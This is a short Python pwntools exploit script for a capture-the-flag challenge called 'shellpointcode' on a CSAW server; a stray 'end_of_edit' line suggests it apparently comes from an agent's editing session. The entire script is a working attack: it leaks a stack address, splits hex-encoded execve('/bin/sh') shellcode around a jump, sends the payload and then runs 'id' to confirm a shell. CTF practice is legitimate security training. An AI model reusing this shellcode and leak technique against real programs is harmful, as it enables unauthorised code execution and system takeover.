from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

part1 = bytes.fromhex('6a0048bf2f62696e2f')
jump = bytes.fromhex('eb08')
part2 = bytes.fromhex('2f736857545f6a3b58990f05')

def exploit(p):
    p.recvuntil(b'node 1:')
    p.sendline(b'AAAA')
    p.recvuntil(b'node 2:')
    p.sendline(b'BBBB')
    p.recvuntil(b'node.next: ')
    leak = int(p.recvline().strip(), 16)
    log.info('leak = %#x' % leak)
    buf = leak - 0x13
    log.info('buf = %#x' % buf)
    p.recvuntil(b'initials:')
    payload = part1 + jump + p64(buf) + part2
    log.info('payload len = %d' % len(payload))
    log.info('payload = %s' % payload.hex())
    p.sendline(payload)
    sleep(0.5)
    p.sendline(b'echo PWNED_MARKER')
    sleep(0.5)
    p.sendline(b'id')
    sleep(0.5)
    try:
        data = p.recvall(timeout=3)
        print("OUTPUT:", data)
    except Exception as e:
        print("ERR:", e)

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        p = remote('pwn.chal.csaw.io', 8000)
    else:
        p = process('./shellpointcode')
    exploit(p)
end_of_edit

